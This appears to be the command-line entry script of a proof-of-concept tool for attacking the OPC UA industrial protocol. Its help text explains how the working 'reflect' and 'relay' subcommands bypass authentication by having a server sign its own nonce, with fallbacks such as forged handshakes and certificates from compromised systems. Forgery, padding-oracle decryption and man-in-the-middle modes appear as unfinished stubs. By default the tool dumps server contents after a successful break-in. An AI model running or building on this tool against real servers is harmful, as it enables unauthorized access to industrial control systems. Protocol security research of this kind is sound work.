#!/usr/bin/env python3

from attacks import *

from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter, Namespace
from abc import ABC


HELP_TEXT = """
Proof of concept tool for attacks against the OPC UA security protocol.
""".strip()

class Attack(ABC):
  """Base class for OPC attack defintions."""
  
  @property
  @abstractmethod
  def subcommand(self) -> str:
    """Command-line subcommand name."""
    ...
    
  @property
  @abstractmethod
  def short_help(self) -> str:
    """Brief description."""
    ...
    
  @property
  @abstractmethod
  def long_help(self) -> str:
    """Extended description."""
    ...
    
  @abstractmethod
  def add_arguments(self, aparser : ArgumentParser):
    """Add attack-specific options."""
    ...
    
  @abstractmethod
  def execute(self, args : Namespace):
    """Executes the attack, given specified options."""
    ...
    

class ReflectAttack(Attack):
  subcommand = 'reflect'
  short_help = 'authentication bypass via reflection attack'
  long_help = """
Log in to an OPC server, pretending to be the server itself by tricking it to 
sign its own nonce.

This works by setting up two sessions to the server. In the first "main" 
session the server's own certificate is supplied in the CreateSessionRequest.
If the server has allowlisted its own certificate (or accepts everyone under
the same CA), it will answer the request with a "nonce" that acts as an 
authentication challenge. Now, the tool will open up a second connection to the
same server and supply this nonce in its CreateSessionRequest. The server will 
answer this as well and set a serverSignature on the nonce. This signature is 
then copied to the ActivateSessionRequest back on the main session, taking 
advantage of the lack of domain separation between client and server signatures.

The default form of the attack only works against servers that support an HTTPS 
endpoint. If that is not the case, you'll need to carry out an OPN forging 
attack against the server first and supply its result with the --forged-opn 
flag.

If the server requires user authentication on top of client authentication, the
same technique is attempted to spoof a user certificate. The attack won't work
if password-based authentication is required.

By default the tool will attempt to negotiate the "None" security policy. If 
the server does not accept this the tool will instead try to perform the 
OpenSecureChannel handshake with an arbitrary self-signed certificate. If that
doesn't work either, you can try bypass the handshake by supplying the 
result of a "opnforge" attack via the --forged-opn option. Alternatively,
you can supply your own certificate and private key (e.g. signed via the 
WebPKI or taken from a compromised system) via --opn-cert and --opn-key.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-o', '--forged-opn', type=FileType('r'),
      help='result of a prior opnforge attack against the server')
    # aparser.add_argument('-c', '--opn-cert', type=FileType('r'),
    #   help='alternative certificate (PEM encoded) to use for the OPN handshake')
    # aparser.add_argument('-k', '--opn-key', type=FileType('r'),
    #   help='private key (PEM encoded) associated with --opn-cert certificate')
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents on success; just tell if attack worked')
    
    aparser.add_argument('url',
      help='Target server OPC URL (either opc.tcp or https protocol)',
      type=str)
    
  def execute(self, args):
    # TODO: OPN/cert options
    reflect_attack(args.url, not args.no_demo)
    
class RelayAttack(Attack):
  subcommand = 'relay'
  short_help = 'authentication bypass via relay attack between two servers'
  long_help = """
Tricks one server A to log you in to server B with A's identity.

This uses the same technique as the reflection attack, except that the two
sessions are set up against different servers.

For the attack to work, an OpenSecureChannel handshake needs to be done with 
both servers. By default, the tool will try either negotiating an unencrypted 
session or using a self-signed certificate for this step. If neither works,
you can use the "opnforge" attack against either or both servers.
Just like with the reflection attack. It is also possible to supply an 
alternative certificate for OPN.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-o', '--forged-opn', type=FileType('r'),
      help='result of a prior opnforge attack against either server')
    aparser.add_argument('-b', '--forged-opn-b', type=FileType('r'),
      help='in case separate forged OPN\'s need to be used for both servers, this one is used for server-b and the -o file is used for server-a')
    # aparser.add_argument('-c', '--opn-cert', type=FileType('r'),
    #   help='alternative certificate (PEM encoded) to use for the OPN handshake')
    # aparser.add_argument('-k', '--opn-key', type=FileType('r'),
    #   help='private key (PEM encoded) associated with --opn-cert certificate')
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents on success; just tell if attack worked')
    
    aparser.add_argument('server-a', 
      help='OPC URL of the server of which to spoof the identity', 
      type=str)
    aparser.add_argument('server-b', 
      help='OPC URL of the server on which to log in asserver-a', 
      type=str)
    
  def execute(self, args):
    # TODO: OPN/cert options
    relay_attack(getattr(args, 'server-a'), getattr(args, 'server-b'), not args.no_demo)
  
class SigForgeAttack(Attack):
  subcommand = 'sigforge'
  short_help = 'TODO: authentication bypass by signature forgery via a PKCS#1 padding oracle'
  long_help = """
TODO
""".strip()
  
  def add_arguments(self, aparser):
    pass
    
  def execute(self, args):
    raise Exception('TODO: implement')

class OPNForgeAttack(Attack):
  subcommand = 'opnforge'
  short_help = 'TODO: signature forgery on an OpenSecureChannel message; enabling reflect/relay/sigforge/mitm against a server that enforces signing or encryption'
  long_help = """
TODO
""".strip()
  
  def add_arguments(self, aparser):
    pass
    
  def execute(self, args):
    raise Exception('TODO: implement')

class DecryptAttack(Attack):
  subcommand = 'decrypt'
  short_help = 'TODO: sniffed password and/or traffic decryption via a PKCS#1 padding oracle'
  long_help = """
TODO
""".strip()
  
  def add_arguments(self, aparser):
    pass
    
  def execute(self, args):
    raise Exception('TODO: implement')

class MitMAttack(Attack):
  subcommand = 'mitm'
  short_help = 'TODO: active MitM attack on an intercepted client-server connection'
  long_help = """
TODO
""".strip()
  
  def add_arguments(self, aparser):
    pass
    
  def execute(self, args):
    raise Exception('TODO: implement')


ENABLED_ATTACKS = [ReflectAttack(), RelayAttack()]


def main():
  # Create argument parser for each attack type.
  aparser = ArgumentParser(description=HELP_TEXT, formatter_class=RawDescriptionHelpFormatter)
  subparsers = aparser.add_subparsers(metavar='attack', help='attack to test', required=True)
  for attack in ENABLED_ATTACKS:
    sparser = subparsers.add_parser(attack.subcommand, help=attack.short_help, description=attack.long_help)
    attack.add_arguments(sparser)
    sparser.set_defaults(attack_obj=attack)
    
  # Parse args and execute attack.
  args = aparser.parse_args()
  try:
    args.attack_obj.execute(args)
  except AttackNotPossible as ex:
    print(f'[-] Attack failed: {ex}')
  
  
if __name__ == '__main__':
  main()
